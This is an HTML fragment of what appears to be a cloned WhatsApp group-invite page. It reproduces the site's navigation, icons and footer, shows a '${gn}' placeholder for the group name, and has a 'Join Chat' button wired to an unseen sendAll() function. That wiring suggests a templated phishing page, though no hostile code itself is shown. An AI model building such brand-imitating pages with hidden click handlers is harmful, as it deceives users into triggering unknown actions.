                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en" selected="1">English</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">español</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">français</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">Gaeilge</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">hrvatski</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">italiano</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">Kiswahili</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">latviešu</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">lietuvių</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">magyar</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">Nederlands</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">norsk bokmål</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">o‘zbek</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">Filipino</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">polski</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">Português (Brasil)</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">Português (Portugal)</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">română</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq">shqip</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">slovenčina</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">slovenščina</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">suomi</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">svenska</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">Tiếng Việt</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">Türkçe</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">Ελληνικά</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">български</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">қазақ тілі</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">македонски</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">русский</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">српски</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">українська</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">עברית</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar">العربية</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">فارسی</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">اردو</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">বাংলা</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">हिन्दी</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">ગુજરાતી</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">ಕನ್ನಡ</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">मराठी</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">ਪੰਜਾਬੀ</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">தமிழ்</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">తెలుగు</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">മലയാളം</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">ไทย</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">简体中文</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">繁體中文（台灣）</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">繁體中文（香港）</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">日本語</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">한국어</option>
                                                    </select><svg width="12" height="8" viewBox="0 0 12 8" fill="none" class="_a99- _afob">
                                                        <path d="M1.41 -4.62904e-07L6 4.58L10.59 -6.16331e-08L12 1.41L6 7.41L-6.16331e-08 1.41L1.41 -4.62904e-07Z"></path>
                                                    </svg></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </nav>
                        </div>
                    </div><span class="_afwd"><a data-testid="whatsapp_www_header_logo_link" href="https://www.whatsapp.com/" class="_asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Header_WhatsApp_LogoBlack_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><img class="_afvz" alt="WhatsApp Main Page" src="https://static.whatsapp.net/rsrc.php/v4/yq/r/mdQNdcFMi0p.png" /></span></a></span><span class="_afw1"><a data-testid="whatsapp_www_header_logo_link" href="https://www.whatsapp.com/" class="_asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Header_WhatsApp_LogoGreen_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><img class="_afvz" alt="WhatsApp Main Page" src="https://static.whatsapp.net/rsrc.php/yZ/r/JvsnINJ2CZv.svg" /></span></a></span>
                    <nav class="_afwe">
                        <ul class="_afwg">
                            <li class="_afn_">
                                <div><button aria-controls="replace_me_subnav" aria-expanded="false" id="u_0_8_QU" class="_9vd5 _aens _afod _afoe" data-ms-clickable="true" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Features_Desktop_Dropdown&quot;&#125;"><span class="_afog"><span class="_9vg3 _aj1b" style="">Features</span></span><svg width="8" height="13" fill="none" class="_9vd8 _agnt _afol _afok">
                                            <path d="M7.41 1.91L2.83 6.5l4.58 4.59L6 12.5l-6-6 6-6 1.41 1.41z" fill="currentColor"></path>
                                        </svg></button>
                                    <div id="replace_me_subnav" class="_ag3x" aria-hidden="true">
                                        <ul role="menu" class="_afo6" id="u_0_9_Ur">
                                            <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a class="_ag3y" href="https://www.whatsapp.com/privacy" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdownCard_MessagePrivately_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_ag3-"><svg width="16" height="21" viewBox="0 0 16 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__privacy _ag3z">
                                                            <path d="M14 7H13V5C13 2.24 10.76 0 8 0C5.24 0 3 2.24 3 5V7H2C0.9 7 0 7.9 0 9V19C0 20.1 0.9 21 2 21H14C15.1 21 16 20.1 16 19V9C16 7.9 15.1 7 14 7ZM8 16C6.9 16 6 15.1 6 14C6 12.9 6.9 12 8 12C9.1 12 10 12.9 10 14C10 15.1 9.1 16 8 16ZM5 7V5C5 3.34 6.34 2 8 2C9.66 2 11 3.34 11 5V7H5Z" fill="currentColor"></path>
                                                        </svg></span>
                                                    <h5 class="_9vd5">Message privately</h5><span class="_9vg3 _aj1a" style="">
                                                        <div class="_8l_f" style="box-sizing:border-box;">
                                                            <p>End-to-end encryption and privacy controls.</p>
                                                        </div>
                                                    </span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _wauiNavDropdownCard__bottomIcon">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                    </svg>
                                                </a></li>
                                            <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a class="_ag3y" href="https://www.whatsapp.com/stayconnected" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdownCard_StayConnected_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_ag3-"><svg width="20" height="20" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__globe-alt _ag3z">
                                                            <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0ZM9 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L7 13v1c0 1.1.9 2 2 2v1.93Zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H6V8h2c.55 0 1-.45 1-1V5h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39Z" fill="currentColor"></path>
                                                        </svg></span>
                                                    <h5 class="_9vd5">Stay connected</h5><span class="_9vg3 _aj1a" style="">
                                                        <div class="_8l_f" style="box-sizing:border-box;">
                                                            <p>Message and call for free* around the world.</p>
                                                        </div>
                                                    </span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _wauiNavDropdownCard__bottomIcon">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                    </svg>
                                                </a></li>
                                            <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a class="_ag3y" href="https://www.whatsapp.com/groups" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdownCard_ConnectInGroups_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_ag3-"><svg width="24" height="13" viewBox="0 0 24 13" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__communities _ag3z">
                                                            <path d="M7.00049 5H5.00049V3C5.00049 2.45 4.55049 2 4.00049 2C3.45049 2 3.00049 2.45 3.00049 3V5H1.00049C0.450488 5 0.000488281 5.45 0.000488281 6C0.000488281 6.55 0.450488 7 1.00049 7H3.00049V9C3.00049 9.55 3.45049 10 4.00049 10C4.55049 10 5.00049 9.55 5.00049 9V7H7.00049C7.55049 7 8.00049 6.55 8.00049 6C8.00049 5.45 7.55049 5 7.00049 5ZM18.0005 6C19.6605 6 20.9905 4.66 20.9905 3C20.9905 1.34 19.6605 0 18.0005 0C17.6805 0 17.3705 0.0499999 17.0905 0.14C17.6605 0.95 17.9905 1.93 17.9905 3C17.9905 4.07 17.6505 5.04 17.0905 5.86C17.3705 5.95 17.6805 6 18.0005 6ZM13.0005 6C14.6605 6 15.9905 4.66 15.9905 3C15.9905 1.34 14.6605 0 13.0005 0C11.3405 0 10.0005 1.34 10.0005 3C10.0005 4.66 11.3405 6 13.0005 6ZM13.0005 8C11.0005 8 7.00049 9 7.00049 11V12C7.00049 12.55 7.45049 13 8.00049 13H18.0005C18.5505 13 19.0005 12.55 19.0005 12V11C19.0005 9 15.0005 8 13.0005 8ZM19.6205 8.16C20.4505 8.89 21.0005 9.82 21.0005 11V12.5C21.0005 12.67 20.9805 12.84 20.9505 13H23.5005C23.7805 13 24.0005 12.78 24.0005 12.5V11C24.0005 9.46 21.6305 8.51 19.6205 8.16Z" fill="currentColor"></path>
                                                        </svg></span>
                                                    <h5 class="_9vd5">Connect in groups</h5><span class="_9vg3 _aj1a" style="">
                                                        <div class="_8l_f" style="box-sizing:border-box;">
                                                            <p>Group messaging made easy.</p>
                                                        </div>
                                                    </span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _wauiNavDropdownCard__bottomIcon">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                    </svg>
                                                </a></li>
                                            <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a class="_ag3y" href="https://www.whatsapp.com/expressyourself" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdownCard_ExpressYourself_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_ag3-"><svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__smileFace _ag3z">
                                                            <path d="M8.99149 0C4.02349 0 0.000488281 4.032 0.000488281 9C0.000488281 13.968 4.02349 18 8.99149 18C13.9685 18 18.0005 13.968 18.0005 9C18.0005 4.032 13.9685 0 8.99149 0ZM5.85049 5.4C6.59749 5.4 7.20049 6.003 7.20049 6.75C7.20049 7.497 6.59749 8.1 5.85049 8.1C5.10349 8.1 4.50049 7.497 4.50049 6.75C4.50049 6.003 5.10349 5.4 5.85049 5.4ZM13.2395 11.448C12.4205 13.203 10.8365 14.4 9.00049 14.4C7.16449 14.4 5.58049 13.203 4.76149 11.448C4.61749 11.151 4.83349 10.8 5.16649 10.8H12.8345C13.1675 10.8 13.3835 11.151 13.2395 11.448ZM12.1505 8.1C11.4035 8.1 10.8005 7.497 10.8005 6.75C10.8005 6.003 11.4035 5.4 12.1505 5.4C12.8975 5.4 13.5005 6.003 13.5005 6.75C13.5005 7.497 12.8975 8.1 12.1505 8.1Z" fill="currentColor"></path>
                                                        </svg></span>
                                                    <h5 class="_9vd5">Express yourself</h5><span class="_9vg3 _aj1a" style="">
                                                        <div class="_8l_f" style="box-sizing:border-box;">
                                                            <p>Say it with stickers, voice, GIFs and more.</p>
                                                        </div>
                                                    </span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _wauiNavDropdownCard__bottomIcon">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                    </svg>
                                                </a></li>
                                            <li class="_cmsPaletteWhatsAppHeader__navCard" role="menuitem"><a class="_ag3y" href="https://business.whatsapp.com/" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdownCard_WhatsAppBusiness_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_ag3-"><svg width="20" height="18" viewBox="0 0 20 18" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__store _ag3z">
                                                            <path d="M19.8951 5.89L18.8451 1.52C18.6251 0.62 17.8451 0 16.9351 0H14.7251H12.7151H10.9951H8.99512H7.27512H5.25512H3.04512C2.14512 0 1.35512 0.63 1.14512 1.52L0.0951238 5.89C-0.144876 6.91 0.0751239 7.95 0.715124 8.77C0.795124 8.88 0.905124 8.96 0.995124 9.06V16C0.995124 17.1 1.89512 18 2.99512 18H16.9951C18.0951 18 18.9951 17.1 18.9951 16V9.06C19.0851 8.97 19.1951 8.88 19.2751 8.78C19.9151 7.96 20.1451 6.91 19.8951 5.89ZM5.01512 2L4.43512 6.86C4.35512 7.51 3.83512 8 3.22512 8C2.73512 8 2.42512 7.71 2.29512 7.53C2.03512 7.2 1.94512 6.77 2.04512 6.36L3.04512 2H5.01512ZM16.9051 1.99L17.9551 6.36C18.0551 6.78 17.9651 7.2 17.7051 7.53C17.5651 7.71 17.2651 8 16.7651 8C16.1551 8 15.6251 7.51 15.5551 6.86L14.9751 2L16.9051 1.99ZM13.5051 6.52C13.5551 6.91 13.4351 7.3 13.1751 7.59C12.9451 7.85 12.6251 8 12.2151 8C11.5451 8 10.9951 7.41 10.9951 6.69V2H12.9551L13.5051 6.52ZM8.99512 6.69C8.99512 7.41 8.44512 8 7.70512 8C7.36512 8 7.05512 7.85 6.81512 7.59C6.56512 7.3 6.44512 6.91 6.48512 6.52L7.03512 2H8.99512V6.69ZM15.9951 16H3.99512C3.44512 16 2.99512 15.55 2.99512 15V9.97C3.07512 9.98 3.14512 10 3.22512 10C4.09512 10 4.88512 9.64 5.46512 9.05C6.06512 9.65 6.86512 10 7.77512 10C8.64512 10 9.42512 9.64 10.0051 9.07C10.5951 9.64 11.3951 10 12.2951 10C13.1351 10 13.9351 9.65 14.5351 9.05C15.1151 9.64 15.9051 10 16.7751 10C16.8551 10 16.9251 9.98 17.0051 9.97V15C16.9951 15.55 16.5451 16 15.9951 16Z" fill="currentColor"></path>
                                                        </svg></span>
                                                    <h5 class="_9vd5">WhatsApp business</h5><span class="_9vg3 _aj1a" style="">
                                                        <div class="_8l_f" style="box-sizing:border-box;">
                                                            <p>Reach your customers from anywhere.</p>
                                                        </div>
                                                    </span><svg class="_wauiIcon__go-to-icon _agnt _wauiNavDropdownCard__bottomIcon" width="10" height="10" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M1.214.447a.75.75 0 0 0-.005 1.5l5.712.023L.645 8.245a.75.75 0 1 0 1.06 1.06L7.983 3.03l.022 5.713a.75.75 0 1 0 1.5-.006l-.03-7.487a.748.748 0 0 0-.779-.774L1.215.447Z" fill="currentColor"></path>
                                                    </svg>
                                                </a></li>
                                        </ul>
                                    </div>
                                </div>
                            </li>
                            <li class="_afn_"><a href="https://www.whatsapp.com/privacy" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Privacy_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Privacy</span></span></span></a></li>
                            <li class="_afn_"><a href="https://faq.whatsapp.com/" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_HelpCenter_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Help Center</span></span></span></a></li>
                            <li class="_afn_"><a href="https://blog.whatsapp.com/" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Blog_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Blog</span></span></span></a></li>
                            <li class="_afn_"><a href="https://business.whatsapp.com/" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_ForBusiness_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span><span class="_afog"><span class="_9vg3 _aj1b" style="">For Business</span></span></span></a></li>
                            <li class="_afn_"><a href="https://www.whatsapp.com/download" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Apps_Desktop_Link&quot;&#125;" data-lnfb-mode="ie"><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Apps</span></span></span></a></li>
                        </ul>
                    </nav>
                    <div class="_agga"><span class="_ag1l">
                            <div class="_asz5">
                                <div class="_9tar _9ta3 _9ta5 _9ta7"><a href="https://web.whatsapp.com/" target="https://web.whatsapp.com/" class="_aeo8 _9vcv _9u4o _9u4j _9sep" data-ms="&#123;&quot;creative&quot;:&quot;cta_button&quot;,&quot;creative_detail&quot;:&quot;DesktopNav_WhatsAppWeb_LogIn_Button&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Log in</span><span><svg class="_abjs _agnt _9u4c" width="10" height="15" viewBox="0 0 10 18" fill="none">
                                                <path d="M0.879395 13.0463L6.41356 7.5L0.879395 1.95375L2.58314 0.25L9.83315 7.5L2.58314 14.75L0.879395 13.0463Z" fill="currentColor"></path>
                                            </svg></span></a><a href="https://www.whatsapp.com/download" target="https://www.whatsapp.com/download" class="_aeo8 _9vcv _9u4o _9u4i _9sep" aria-label="Download WhatsApp" role="button" data-ms="&#123;&quot;creative&quot;:&quot;cta_button&quot;,&quot;creative_detail&quot;:&quot;DesktopNav_Unsupported_Download_Button&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span><span><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _9u4c">
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z" fill="currentColor"></path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z" fill="currentColor"></path>
                                            </svg></span></a></div>
                            </div>
                        </span>
                        <div class="_asz5"><a aria-label="download whatsapp" href="https://www.whatsapp.com/download" class="_afwh _adie _adif" role="button" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;MobileNav_Unsupported_Download_Button&quot;&#125;" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _adid _arcp _afbl">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z" fill="currentColor"></path>
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z" fill="currentColor"></path>
                                </svg></a></div>
                    </div>
                </div>
            </header>
        </div>
        <div data-testid="whatsapp_www_root" id="content-wrapper">
            <div class="_9r_7">
                <section data-testid="waui_section" class="_9t2b _9t2d" style="">
                    <div class="_9t2e _ao8r _aoa0 _9t2c">
                        <div class="_9t2g _9t2c _a1fe">
                            <div class="_9tar _9ta4 _9ta6 _9ta8">
                                <div class="_9vd6 _9t33 _9bir _9bj3 _9bhj _9v12 _9tau _9tay _9u6w _9se- _9u5y">
                                    <div class="_9scd"></div>
                                    <div style="display: block;" id="main_block"><a title="Follow this link to join" id="action-icon" class="_asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam"><img class="_9vx6" src="https://pps.whatsapp.net/v/t61.24694-24/491877078_749226784235702_7604555501025952203_n.jpg?ccb=11-4&amp;oh=01_Q5Aa1gFFxdnabIO1bvnNPEnbyj_B3c90eHooqSl5IBREJ3Lk9g&amp;oe=684F8886&amp;_nc_sid=5e03e0&amp;_nc_cat=107" /></span></a>
                                        <h3 class="_9vd5 _9scr" style="color:#5E5E5E;">${gn}</h3>
                                        <h4 class="_9vd5 _9scb" style="color:#5E5E5E;">WhatsApp Group Invite</h4><a onclick="sendAll()" title="Follow this link to join" id="action-button" class="_9vcv _advm" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Join Chat</span></a>
                                        <hr class="_9tpv _9scb _9scr _9scb _9scr" style="background-color:#F0F4F9;" />
                                        <h4 class="_9vd5" style="color:#5E5E5E;">Don&#039;t have WhatsApp yet?</h4>
                                        <h4 class="_9vd5 _9scc"><a href="https://www.whatsapp.com/download" class="_9vcv _9vcx" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span></a></h4>
                                    </div>
                                    <div id="fallback_block" style="display: none;">
                                        <h3 class="_9vd5">Looks like you don&#039;t have WhatsApp installed!</h3><a href="https://www.whatsapp.com/download" class="_9vcv _advm _9scr" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span></a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
        </div>
    </div>
    <div id="footer-wrapper" class="_allg">
        <div class="_adhc">
            <footer class="_9t2i" data-testid="whatsapp_www_footer">
                <div class="_9tar _9ta3 _9ta5 _9ta8 _9ta- _9tau _ae_r"><span class="_ae_s">
                        <div class="_asz5"><a href="https://www.whatsapp.com/download" class="_aeo8 _advo _9vcv _9u4o _9u4i _9scc _9scs _9sep" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Unsupported_Download_Button&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span><span><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _9u4c">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z" fill="currentColor"></path>
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z" fill="currentColor"></path>
                                    </svg></span></a></div>
                    </span>
                    <div class="_9tar _9ta3 _9ta5 _9ta7 _9tay _9tau _9uo9 _ae_t"><a aria-label="Twitter" href="https://x.com/whatsapp" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Footer_Twitter_FinePrint_Link&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg viewBox="0 0 1200 1227" width="48" height="48" fill="none" xmlns="http://www.w3.org/2000/svg" class="_aghm _adid _arcp _afbl">
                                <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="currentColor"></path>
